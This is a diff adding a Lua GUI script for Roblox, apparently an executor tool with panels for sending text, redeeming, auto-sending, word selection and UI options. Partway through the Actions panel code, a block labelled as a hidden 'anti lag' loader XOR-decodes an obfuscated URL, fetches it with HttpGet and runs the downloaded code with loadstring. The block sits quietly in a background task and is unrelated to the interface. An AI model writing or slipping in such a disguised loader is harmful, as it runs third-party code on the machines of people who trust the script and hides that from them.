+		Parent = ScreenGui
+	})
+	UIScale = v26("UIScale", {
+		Scale = t3.UIScale,
+		Parent = Frame2
+	})
+
+	local n6 = 1
+
+	local function v143()
+		local ViewportSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
+		local v145 = math.min(ViewportSize.X, ViewportSize.Y)
+
+		if v15 then
+			return math.clamp(v145 / 900, 0.55, 0.85)
+		end
+
+		if UserInputService.TouchEnabled then
+			if not UserInputService.KeyboardEnabled then
+				return math.clamp(v145 / 760, 0.72, 1)
+			end
+		end
+
+		return math.clamp(v145 / 900, 0.85, 1.1)
+	end
+	local function v146()
+		n6 = v143()
+		UIScale.Scale = math.clamp((t3.UIScale or 1) * n6, 0.4, 1.35)
+	end
+
+	v41 = function(p51)
+		t3.UIScale = math.clamp(tonumber(p51) or 1, 0.5, 1.25)
+		v146()
+		t4.Settings = t4.Settings or {}
+		t4.Settings.UIScale = t3.UIScale
+		v35()
+	end
+	v146()
+	task.defer(v146)
+
+	if workspace.CurrentCamera then
+		local connection2 = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(v146)
+
+		table.insert(genv.CloverRedeemerConnections, connection2)
+	end
+
+	v42 = function(p52, p53, p54)
+		local v148 = v67(p52)
+		local v149 = t4.Panels[v148] or {}
+		local v150 = p53
+		local uDim2 = UDim2.fromOffset(p53.X.Offset, 50)
+		local v152 = v69(v149.Position, p54)
+
+		t12[v148] = {
+			Position = p54,
+			Size = p53
+		}
+
+		local Frame3 = v26("Frame", {
+			Size = p53,
+			Position = v152,
+			BackgroundColor3 = t1.BG,
+			ClipsDescendants = true,
+			Parent = Frame2
+		})
+
+		v27(Frame3, 14)
+		v31(Frame3, t1.WHITE, 2.5, 0.28):SetAttribute("ThemeStroke", true)
+		v37(Frame3, 0.38)
+		v28(Frame3, 14, 14, 14, 14)
+
+		local Frame4 = v26("Frame", {
+			Size = UDim2.new(1, 0, 0, 22),
+			BackgroundTransparency = 1,
+			Parent = Frame3
+		})
+		local TextButton2 = v26("TextButton", {
+			Size = UDim2.new(1, 0, 1, 0),
+			BackgroundTransparency = 1,
+			Text = "",
+			ZIndex = 1,
+			Parent = Frame4
+		})
+		local Frame5 = v26("Frame", {
+			Size = UDim2.new(0.5, 0, 1, 0),
+			BackgroundTransparency = 1,
+			ZIndex = 2,
+			Parent = Frame4
+		})
+
+		v30(Frame5, 8, Enum.VerticalAlignment.Center)
+		v27(v26("Frame", {
+			Size = UDim2.fromOffset(6, 6),
+			BackgroundColor3 = t1.GREEN,
+			BorderSizePixel = 0,
+			Parent = Frame5
+		}), 3)
+		v26("TextLabel", {
+			Size = UDim2.new(1, -14, 1, 0),
+			BackgroundTransparency = 1,
+			Text = p52,
+			TextColor3 = t1.WHITE,
+			Font = Enum.Font.GothamBold,
+			TextSize = 13,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Parent = Frame5
+		})
+
+		local Frame6 = v26("Frame", {
+			Size = UDim2.new(0.5, 0, 1, 0),
+			Position = UDim2.new(0.5, 0, 0, 0),
+			BackgroundTransparency = 1,
+			ZIndex = 3,
+			Parent = Frame4
+		})
+
+		v30(Frame6, 6, Enum.VerticalAlignment.Center).HorizontalAlignment = Enum.HorizontalAlignment.Right
+
+		local TextButton3 = v26("TextButton", {
+			Size = UDim2.fromOffset(18, 18),
+			BackgroundColor3 = Color3.fromRGB(42, 24, 28),
+			Text = "X",
+			TextColor3 = t1.RED,
+			Font = Enum.Font.GothamBold,
+			TextSize = 10,
+			AutoButtonColor = false,
+			LayoutOrder = 98,
+			Parent = Frame6
+		})
+
+		v27(TextButton3, 5)
+
+		local v159 = v31(TextButton3, t1.RED, 1, 0.65)
+
+		v39(TextButton3, Color3.fromRGB(42, 24, 28), v159, Color3.fromRGB(54, 28, 32))
+
+		local TextButton4 = v26("TextButton", {
+			Size = UDim2.fromOffset(18, 18),
+			BackgroundColor3 = Color3.fromRGB(24, 36, 28),
+			Text = "-",
+			TextColor3 = t1.GREEN,
+			Font = Enum.Font.GothamBold,
+			TextSize = 10,
+			AutoButtonColor = false,
+			LayoutOrder = 99,
+			Parent = Frame6
+		})
+
+		v27(TextButton4, 5)
+
+		local v161 = v31(TextButton4, t1.GREEN, 1, 0.7)
+
+		v39(TextButton4, Color3.fromRGB(24, 36, 28), v161, Color3.fromRGB(20, 42, 25))
+
+		local Frame7 = v26("Frame", {
+			Size = UDim2.new(1, 0, 1, -26),
+			Position = UDim2.new(0, 0, 0, 26),
+			BackgroundTransparency = 1,
+			Parent = Frame3
+		})
+		local minimized = v149.Minimized == true
+
+		local function v164()
+			t4.Panels[v148] = t4.Panels[v148] or {}
+			t4.Panels[v148].Position = v68(Frame3.Position)
+			t4.Panels[v148].Minimized = minimized
+			v35()
+		end
+
+		if minimized then
+			Frame3.Size = uDim2
+			Frame7.Visible = false
+			TextButton4.Text = "+"
+		end
+
+		TextButton3.MouseButton1Click:Connect(function()
+			Frame3.Visible = false
+		end)
+		TextButton4.MouseButton1Click:Connect(function()
+			minimized = not minimized
+
+			local text = minimized and "+"
+
+			TextButton4.Text = text or "-"
+
+			if minimized then
+				Frame7.Visible = false
+			end
+
+			v164()
+
+			if t3.AnimationsEnabled then
+				TweenService:Create(Frame3, TweenInfo.new(0.2, Enum.EasingStyle.Quart, minimized and Enum.EasingDirection.In or Enum.EasingDirection.Out), {
+					Size = minimized and uDim2 or v150
+				}):Play()
+
+				if not minimized then
+					task.delay(0.069999999999999993, function()
+						if not minimized then
+							Frame7.Visible = true
+						end
+					end)
+				end
+			else
+				Frame3.Size = minimized and uDim2 or v150
+				Frame7.Visible = not minimized
+			end
+		end)
+		v127(Frame3, TextButton2, v164)
+		t13[v148] = {
+			frame = Frame3,
+			normalSize = v150
+		}
+
+		return Frame3, Frame7, Frame6
+	end
+	v43 = function()
+		for k, v in pairs(t12) do
+			local v168 = t13[k]
+
+			if v168 and v168.frame then
+				v168.frame.Position = v.Position
+				v168.frame.Size = v168.normalSize
+				v168.frame.Visible = true
+			end
+
+			t4.Panels[k] = t4.Panels[k] or {}
+			t4.Panels[k].Position = v68(v.Position)
+			t4.Panels[k].Minimized = false
+		end
+
+		TextButton.Position = UDim2.new(0, 24, 1, -82)
+		v35()
+	end
+end
+
+local Status, v170, v171 = v42("Status", UDim2.fromOffset(260, 95), UDim2.new(0.5, -410, 0.5, -245))
+local TextLabel = v26("TextLabel", {
+	LayoutOrder = 1,
+	Size = UDim2.new(0, 75, 1, 0),
+	BackgroundTransparency = 1,
+	Text = "3/3 LINKED",
+	TextColor3 = t1.DIM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	TextXAlignment = Enum.TextXAlignment.Right,
+	Parent = v171
+})
+local Frame3 = v26("Frame", {
+	Size = UDim2.new(1, 0, 1, 0),
+	BackgroundTransparency = 1,
+	Parent = v170
+})
+
+v30(Frame3, 6)
+
+local function v174(p55)
+	local Frame4 = v26("Frame", {
+		Size = UDim2.new(0.33333333333333331, -4, 1, 0),
+		BackgroundColor3 = t1.INNER,
+		Parent = Frame3
+	})
+
+	v27(Frame4, 8)
+	v31(Frame4, t1.WHITE, 1, 0.93)
+
+	local Frame5 = v26("Frame", {
+		Size = UDim2.fromScale(1, 1),
+		BackgroundTransparency = 1,
+		Parent = Frame4
+	})
+
+	v30(Frame5, 6, Enum.VerticalAlignment.Center)
+	v28(Frame5, 0, 0, 8, 4)
+
+	local Frame6 = v26("Frame", {
+		Size = UDim2.fromOffset(6, 6),
+		BackgroundColor3 = t1.RED,
+		BorderSizePixel = 0,
+		Parent = Frame5
+	})
+
+	v27(Frame6, 3)
+
+	return Frame6, (v26("TextLabel", {
+		Size = UDim2.new(1, -12, 1, 0),
+		BackgroundTransparency = 1,
+		Text = p55,
+		TextColor3 = t1.DIM,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = Frame5
+	}))
+end
+
+local Label, v179 = v174("Label")
+local Box, v181 = v174("Box")
+local Redeem, v183 = v174("Redeem")
+local livePreview, v185 = v42("Live preview", UDim2.fromOffset(280, 280), UDim2.new(0.5, -410, 0.5, -135))
+local Frame4 = v26("Frame", {
+	Size = UDim2.new(1, 0, 0, 28),
+	BackgroundColor3 = t1.INNER_DARK,
+	Parent = v185
+})
+
+v27(Frame4, 8)
+v28(Frame4, 3, 3, 3, 3)
+v30(Frame4, 4)
+
+local TextButton2 = v26("TextButton", {
+	Size = UDim2.new(0.5, -2, 1, 0),
+	BackgroundColor3 = t1.INNER,
+	Text = "Live Preview",
+	TextColor3 = t1.NEON,
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	AutoButtonColor = false,
+	Parent = Frame4
+})
+
+v27(TextButton2, 6)
+
+local TextButton3 = v26("TextButton", {
+	Size = UDim2.new(0.5, -2, 1, 0),
+	BackgroundTransparency = 1,
+	Text = "History",
+	TextColor3 = t1.DIM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	AutoButtonColor = false,
+	Parent = Frame4
+})
+
+v27(TextButton3, 6)
+
+local Frame5 = v26("Frame", {
+	Size = UDim2.new(1, 0, 1, -34),
+	Position = UDim2.new(0, 0, 0, 34),
+	BackgroundTransparency = 1,
+	Parent = v185
+})
+
+v29(Frame5, 8)
+
+local Frame6 = v26("Frame", {
+	Size = UDim2.new(1, 0, 0, 90),
+	BackgroundColor3 = t1.INNER_DARK,
+	Parent = Frame5
+})
+
+v27(Frame6, 10)
+v28(Frame6, 10, 10, 12, 12)
+
+local TextLabel2 = v26("TextLabel", {
+	Size = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	Text = "(waiting…)",
+	TextColor3 = t1.TEXT,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	TextWrapped = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Top,
+	Parent = Frame6
+})
+local Frame7 = v26("Frame", {
+	Size = UDim2.new(1, 0, 0, 14),
+	BackgroundTransparency = 1,
+	Parent = Frame5
+})
+
+v26("TextLabel", {
+	Size = UDim2.new(0.5, 0, 1, 0),
+	BackgroundTransparency = 1,
+	Text = "WILL SEND",
+	TextColor3 = t1.DIM2,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = Frame7
+})
+
+local TextLabel3 = v26("TextLabel", {
+	Size = UDim2.new(0.5, 0, 1, 0),
+	Position = UDim2.fromScale(0.5, 0),
+	BackgroundTransparency = 1,
+	Text = "0 words",
+	TextColor3 = t1.DIM2,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Right,
+	Parent = Frame7
+})
+local Frame8 = v26("Frame", {
+	Size = UDim2.new(1, 0, 1, -120),
+	BackgroundColor3 = t1.INNER,
+	Parent = Frame5
+})
+
+v27(Frame8, 10)
+v31(Frame8, t1.GREEN, 1, 0.85)
+v28(Frame8, 10, 10, 12, 12)
+
+local TextLabel4 = v26("TextLabel", {
+	Size = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	Text = "—",
+	TextColor3 = t1.GREEN,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	TextWrapped = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Top,
+	Parent = Frame8
+})
+local Frame9 = v26("Frame", {
+	Size = UDim2.new(1, 0, 1, -34),
+	Position = UDim2.new(0, 0, 0, 34),
+	BackgroundTransparency = 1,
+	Visible = false,
+	Parent = v185
+})
+local TextLabel5 = v26("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 14),
+	BackgroundTransparency = 1,
+	Text = "0 sentences",
+	TextColor3 = t1.DIM2,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = Frame9
+})
+local ScrollingFrame = v26("ScrollingFrame", {
+	Size = UDim2.new(1, 0, 1, -18),
+	Position = UDim2.new(0, 0, 0, 18),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ScrollBarThickness = 3,
+	ScrollBarImageColor3 = t1.GREEN,
+	CanvasSize = UDim2.new(),
+	AutomaticCanvasSize = Enum.AutomaticSize.Y,
+	Parent = Frame9
+})
+
+v29(ScrollingFrame, 4)
+
+local function v199(p56)
+	Frame5.Visible = not p56
+	Frame9.Visible = p56
+	TextButton2.BackgroundTransparency = p56 and 1 or 0
+	TextButton2.BackgroundColor3 = t1.INNER
+	TextButton2.TextColor3 = p56 and t1.DIM or t1.NEON
+	TextButton3.BackgroundTransparency = p56 and 0 or 1
+	TextButton3.BackgroundColor3 = t1.INNER
+	TextButton3.TextColor3 = p56 and t1.NEON or t1.DIM
+end
+
+TextButton2.MouseButton1Click:Connect(function()
+	v199(false)
+end)
+TextButton3.MouseButton1Click:Connect(function()
+	v199(true)
+end)
+
+local Texts, v201 = v42("Texts", UDim2.fromOffset(260, 120), UDim2.new(0.5, -410, 0.5, 115))
+
+v29(v201, 7)
+
+local ScrollingFrame2 = v26("ScrollingFrame", {
+	Size = UDim2.new(1, 0, 0, 34),
+	BackgroundColor3 = t1.INNER_DARK,
+	BorderSizePixel = 0,
+	ScrollBarThickness = 2,
+	ScrollBarImageColor3 = t1.GREEN,
+	CanvasSize = UDim2.new(),
+	AutomaticCanvasSize = Enum.AutomaticSize.X,
+	ScrollingDirection = Enum.ScrollingDirection.X,
+	Parent = v201
+})
+
+v27(ScrollingFrame2, 8)
+v28(ScrollingFrame2, 4, 4, 4, 4)
+
+local v203 = v30(ScrollingFrame2, 5)
+local TextLabel6 = v26("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 16),
+	BackgroundTransparency = 1,
+	Text = "0 notifications",
+	TextColor3 = t1.DIM2,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = v201
+})
+local TextLabel7 = v26("TextLabel", {
+	Size = UDim2.new(1, 0, 1, -57),
+	BackgroundTransparency = 1,
+	Text = "Select a notification tab, then press F to send it.",
+	TextColor3 = t1.DIM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	TextWrapped = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Top,
+	Parent = v201
+})
+local Actions, v207 = v42("Actions", UDim2.fromOffset(240, 245), UDim2.new(0.5, -135, 0.5, -245))
+
+v29(v207, 8)
+
+local Frame10 = v26("Frame", {
+	Size = UDim2.new(1, 0, 0, 38),
+	BackgroundTransparency = 1,
+	Parent = v207
+})
+
+v30(Frame10, 6)
+
+local TextButton4 = v26("TextButton", {
+	Size = UDim2.new(0.5, -3, 1, 0),
+	BackgroundColor3 = t1.INNER,
+	Text = "▶ Send",
+	TextColor3 = t1.NEON,
+	Font = Enum.Font.GothamBold,
+	TextSize = 13,
+	AutoButtonColor = false,
+	Parent = Frame10
+})
+local v210 = v31(TextButton4, t1.NEON, 1, 0.6)
+
+v27(TextButton4, 10)
+
+local TextButton5 = v26("TextButton", {
+	Size = UDim2.new(0.5, -3, 1, 0),
+	BackgroundColor3 = t1.NEON,
+	Text = "★ Redeem",
+	TextColor3 = t1.BG,
+	Font = Enum.Font.GothamBold,
+	TextSize = 13,
+	AutoButtonColor = false,
+	Parent = Frame10
+})
+-- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+TextButton5:SetAttribute("ThemeRedeemButton", true)
+v27(TextButton5, 10)
+v37(TextButton5, 0.22)
+v39(TextButton4, t1.INNER, v210)
+v39(TextButton5, t1.NEON, nil, t1.NEON:Lerp(t1.WHITE, 0.15))
+
+local TextButton6 = v26("TextButton", {
+	Size = UDim2.new(1, 0, 0, 36),
+	BackgroundColor3 = t1.INNER,
+	AutoButtonColor = false,
+	Text = "",
+	Parent = v207
+})
+local v213 = v31(TextButton6, t1.WHITE, 1, 0.95)
+
+v27(TextButton6, 10)
+v26("TextLabel", {
+	Size = UDim2.new(1, -60, 1, 0),
+	Position = UDim2.fromOffset(12, 0),
+	BackgroundTransparency = 1,
+	Text = "⟳ Auto-send",
+	TextColor3 = t1.TEXT,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = TextButton6
+})
+
+local TextLabel8 = v26("TextLabel", {
+	Size = UDim2.fromOffset(46, 20),
+	Position = UDim2.new(1, -58, 0.5, -10),
+	BackgroundColor3 = Color3.fromRGB(30, 45, 35),
+	Text = "OFF",
+	TextColor3 = t1.DIM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	Parent = TextButton6
+})
+
+v27(TextLabel8, 6)
+v39(TextButton6, t1.INNER, v213)
+
+local Frame11 = v26("Frame", {
+	Size = UDim2.new(1, 0, 0, 28),
+	BackgroundColor3 = t1.INNER,
+	Parent = v207
+})
+
+v27(Frame11, 8)
+v31(Frame11, t1.WHITE, 1, 0.93)
+
+local TextLabel9 = v26("TextLabel", {
+	Size = UDim2.new(1, -66, 1, 0),
+	Position = UDim2.fromOffset(10, 0),
+	BackgroundTransparency = 1,
+	Text = "Auto Redeemer: OFF",
+	TextColor3 = t1.TEXT,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = Frame11
+})
+local TextButton7 = v26("TextButton", {
+	Size = UDim2.fromOffset(24, 22),
+	Position = UDim2.new(1, -58, 0.5, -11),
+	BackgroundColor3 = t1.INNER_DARK,
+	Text = "◀",
+	TextColor3 = t1.NEON,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	AutoButtonColor = false,
+	Parent = Frame11
+})
+
+v27(TextButton7, 6)
+
+local v219 = v31(TextButton7, t1.NEON, 1, 0.7)
+
+v39(TextButton7, t1.INNER_DARK, v219)
+
+local TextButton8 = v26("TextButton", {
+	Size = UDim2.fromOffset(24, 22),
+	Position = UDim2.new(1, -30, 0.5, -11),
+	BackgroundColor3 = t1.INNER_DARK,
+	Text = "▶",
+	TextColor3 = t1.NEON,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	AutoButtonColor = false,
+	Parent = Frame11
+})
+
+v27(TextButton8, 6)
+
+local v221 = v31(TextButton8, t1.NEON, 1, 0.7)
+
+v39(TextButton8, t1.INNER_DARK, v221)
+
+local t18 = {
+	Label = TextLabel9,
+	LeftBtn = TextButton7,
+	RightBtn = TextButton8
+}
+local TextButton9 = v26("TextButton", {
+	Size = UDim2.new(1, 0, 0, 34),
+	BackgroundTransparency = 1,
+	Text = "Clear box",
+	TextColor3 = t1.RED,
+	Font = Enum.Font.GothamBold,
+	TextSize = 12,
+	AutoButtonColor = false,
+	Parent = v207
+})
+local v223 = v31(TextButton9, t1.RED, 1, 0.8)
+
+v27(TextButton9, 10)
+v39(TextButton9, Color3.fromRGB(0, 0, 0), v223, Color3.fromRGB(40, 15, 15))
+v26("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 32),
+	BackgroundTransparency = 1,
+	Text = "HOTKEYS\nF Send  R Redeem  Q Auto  E Clear",
+	TextColor3 = t1.DIM2,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	TextWrapped = true,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	TextYAlignment = Enum.TextYAlignment.Center,
+	Parent = v207
+})
+
+local Words, v225, v226 = v42("Words", UDim2.fromOffset(240, 295), UDim2.new(0.5, -135, 0.5, -45))
+local TextButton10 = v26("TextButton", {
+	LayoutOrder = 1,
+	Size = UDim2.fromOffset(34, 18),
+	BackgroundColor3 = t1.INNER,
+	Text = "All",
+	TextColor3 = t1.NEON,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	AutoButtonColor = false,
+	Parent = v226
+})
+local v228 = v31(TextButton10, t1.NEON, 1, 0.7)
+
+v27(TextButton10, 5)
+
+local TextButton11 = v26("TextButton", {
+	LayoutOrder = 2,
+	Size = UDim2.fromOffset(38, 18),
+	BackgroundColor3 = t1.INNER,
+	Text = "None",
+	TextColor3 = t1.DIM,
+	Font = Enum.Font.GothamBold,
+	TextSize = 10,
+	AutoButtonColor = false,
+	Parent = v226
+})
+local v230 = v31(TextButton11, t1.WHITE, 1, 0.9)
+
+v27(TextButton11, 5)
+v39(TextButton10, t1.INNER, v228)
+v39(TextButton11, t1.INNER, v230)
+
+local ScrollingFrame3 = v26("ScrollingFrame", {
+	Size = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ScrollBarThickness = 3,
+	ScrollBarImageColor3 = t1.GREEN,
+	CanvasSize = UDim2.new(),
+	AutomaticCanvasSize = Enum.AutomaticSize.Y,
+	Parent = v225
+})
+
+v29(ScrollingFrame3, 5)
+
+local t19, t20
+
+do
+	local Options, v235 = v42("Options", UDim2.fromOffset(240, 285), UDim2.new(0.5, -135, 0.5, 120))
+
+	v29(v235, 8)
+
+	local function v236(p57, p58, p59, p60)
+		local Frame12 = v26("Frame", {
+			Size = UDim2.new(1, 0, 0, 34),
+			BackgroundColor3 = t1.INNER,
+			Parent = p57
+		})
+
+		v27(Frame12, 8)
+		v31(Frame12, t1.WHITE, 1, 0.96)
+		v28(Frame12, 0, 0, 10, 10)
+		v26("TextLabel", {
+			Size = UDim2.new(1, -40, 1, 0),
+			BackgroundTransparency = 1,
+			Text = p58,
+			TextColor3 = t1.TEXT,
+			Font = Enum.Font.GothamBold,
+			TextSize = 11,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Parent = Frame12
+		})
+
+		local u238 = p59
+		local TextButton12 = v26("TextButton", {
+			Size = UDim2.fromOffset(32, 16),
+			Position = UDim2.new(1, -32, 0.5, -8),
+			BackgroundColor3 = u238 and t1.GREEN or Color3.fromRGB(50, 50, 50),
+			Text = "",
+			AutoButtonColor = false,
+			Parent = Frame12
+		})
+
+		v27(TextButton12, 8)
+
+		local Frame13 = v26("Frame", {
+			Size = UDim2.fromOffset(12, 12),
+			Position = UDim2.new(0, u238 and 18 or 2, 0.5, -6),
+			BackgroundColor3 = t1.WHITE,
+			Parent = TextButton12
+		})
+
+		v27(Frame13, 6)
+		TextButton12.MouseButton1Click:Connect(function()
+			u238 = not u238
+
+			if t3.AnimationsEnabled then
+				TweenService:Create(TextButton12, TweenInfo.new(0.15), {
+					BackgroundColor3 = u238 and t1.GREEN or Color3.fromRGB(50, 50, 50)
+				}):Play()
+				TweenService:Create(Frame13, TweenInfo.new(0.15, Enum.EasingStyle.Back), {
+					Position = UDim2.new(0, u238 and 18 or 2, 0.5, -6)
+				}):Play()
+			else
+				TextButton12.BackgroundColor3 = u238 and t1.GREEN or Color3.fromRGB(50, 50, 50)
+				Frame13.Position = UDim2.new(0, u238 and 18 or 2, 0.5, -6)
+			end
+
+			p60(u238)
+		end)
+
+		return Frame12
+	end
+	local function v241(p61, p62, p63, p64)
+		local Frame12 = v26("Frame", {
+			Size = UDim2.new(1, 0, 0, 56),
+			BackgroundColor3 = t1.INNER,
+			Parent = p61
+		})
+
+		v27(Frame12, 8)
+		v31(Frame12, t1.WHITE, 1, 0.96)
+		v28(Frame12, 0, 0, 10, 10)
+		v26("TextLabel", {
+			Size = UDim2.new(1, -55, 0, 22),
+			BackgroundTransparency = 1,
+			Text = p62,
+			TextColor3 = t1.TEXT,
+			Font = Enum.Font.GothamBold,
+			TextSize = 11,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Parent = Frame12
+		})
+
+		local TextLabel10 = v26("TextLabel", {
+			Size = UDim2.fromOffset(48, 22),
+			Position = UDim2.new(1, -48, 0, 0),
+			BackgroundTransparency = 1,
+			Text = "",
+			TextColor3 = t1.NEON,
+			Font = Enum.Font.GothamBold,
+			TextSize = 10,
+			TextXAlignment = Enum.TextXAlignment.Right,
+			Parent = Frame12
+		})
+		local Frame13 = v26("Frame", {
+			Name = "ScaleBar",
+			Size = UDim2.new(1, -12, 0, 12),
+			Position = UDim2.new(0, 6, 1, -20),
+			BackgroundColor3 = t1.INNER_DARK,
+			BorderSizePixel = 0,
+			Parent = Frame12
+		})
+
+		Frame13:SetAttribute("KeepScaleColor", true)
+		v27(Frame13, 6)
+		v31(Frame13, t1.WHITE, 1, 0.75)
+
+		local Frame14 = v26("Frame", {
+			Name = "ScaleFill",
+			Size = UDim2.fromScale(0, 1),
+			BackgroundColor3 = t1.GREEN,
+			BorderSizePixel = 0,
+			Parent = Frame13
+		})
+
+		Frame14:SetAttribute("KeepScaleColor", true)
+		v27(Frame14, 6)
+
+		local TextButton12 = v26("TextButton", {
+			Name = "ScaleKnob",
+			Size = UDim2.fromOffset(24, 24),
+			Position = UDim2.new(0, 0, 0.5, -12),
+			AnchorPoint = Vector2.new(0.5, 0),
+			BackgroundColor3 = t1.WHITE,
+			Text = "",
+			AutoButtonColor = false,
+			ZIndex = 6,
+			Parent = Frame13
+		})
+
+		TextButton12:SetAttribute("KeepScaleColor", true)
+		v27(TextButton12, 12)
+		v31(TextButton12, t1.NEON, 2, 0.15):SetAttribute("ThemeStroke", true)
+
+		local function v247(p65)
+			local v248 = math.clamp(p65, 0.5, 1.25)
+			local v249 = (v248 - 0.5) / 0.75
+
+			Frame14.Size = UDim2.fromScale(v249, 1)
+			TextButton12.Position = UDim2.new(v249, 0, 0.5, -12)
+			TextLabel10.Text = tostring(math.floor(v248 * 100 + 0.5)) .. "PCT"
+			p64(v248)
+		end
+
+		local X
+		local X2
+
+		local function v252(p66)
+			return 0.5 + 0.75 * math.clamp((p66 - (X or Frame13.AbsolutePosition.X)) / math.max(X2 or Frame13.AbsoluteSize.X, 1), 0, 1)
+		end
+
+		local u253 = false
+
+		local function v254(p67)
+			u253 = true
+			X = Frame13.AbsolutePosition.X
+			X2 = Frame13.AbsoluteSize.X
+			v247(v252(p67.Position.X))
+		end
+
+		TextButton12.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				v254(input)
+			end
+		end)
+		Frame13.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 then
+				v254(input)
+
+				return
+			elseif input.UserInputType == Enum.UserInputType.Touch then
+				v254(input)
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if u253 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				v247(v252(input.Position.X))
+			end
+		end)
+		UserInputService.InputEnded:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				u253 = false
+				X = nil
+				X2 = nil
+			end
+		end)
+		task.defer(function()
+			v247(p63)
+		end)
+
+		return Frame12
+	end
+
+	v26("TextLabel", {
+		Size = UDim2.new(1, 0, 0, 14),
+		BackgroundTransparency = 1,
+		Text = "🛠️ OPTIMIZER  (" .. (v15 and "MOBILE" or "PC") .. ")",
+		TextColor3 = t1.DIM2,
+		Font = Enum.Font.GothamBold,
+		TextSize = 10,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = v235
+	})
+
+	local function v255()
+		return t2[(table.find(t2, t3.Theme) or 1) % #t2 + 1]
+	end
+
+	local TextButton12 = v26("TextButton", {
+		Size = UDim2.new(1, 0, 0, 34),
+		BackgroundColor3 = t1.INNER,
+		Text = "Theme: " .. t3.Theme,
+		TextColor3 = t1.NEON,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		AutoButtonColor = false,
+		Parent = v235
+	})
+
+	v27(TextButton12, 8)
+
+	local v257 = v31(TextButton12, t1.NEON, 1, 0.65)
+
+	v37(TextButton12, 0.28)
+	v39(TextButton12, t1.INNER, v257)
+	TextButton12.MouseButton1Click:Connect(function()
+		t3.Theme = v255()
+		t4.Settings = t4.Settings or {}
+		t4.Settings.Theme = t3.Theme
+		TextButton12.Text = "Theme: " .. t3.Theme
+		TextButton12.TextColor3 = t1.NEON
+		v38()
+		v35()
+	end)
+	v241(v235, "UI Scale", t3.UIScale, v41)
+
+	local connection
+
+	local function v259()
+		local t21 = {}
+		local Animations = game:GetService("ReplicatedStorage"):FindFirstChild("Animations")
+		local Animals = Animations and Animations:FindFirstChild("Animals")
+
+		if not Animals then
+			return t21, false
+		end
+
+		for _, descendant in ipairs(Animals:GetDescendants()) do
+			if not descendant:IsA("Animation") or descendant.AnimationId == "" then
+				if descendant:IsA("StringValue") then
+					if tostring(descendant.Value):match("^rbxassetid://") then
+						t21[tostring(descendant.Value)] = true
+
+						continue
+					end
+				end
+
+				if (descendant:IsA("NumberValue") or descendant:IsA("IntValue")) and tonumber(descendant.Value) and descendant.Value ~= 0 then
+					t21["rbxassetid://" .. tostring(descendant.Value)] = true
+				end
+			else
+				t21[descendant.AnimationId] = true
+			end
+		end
+
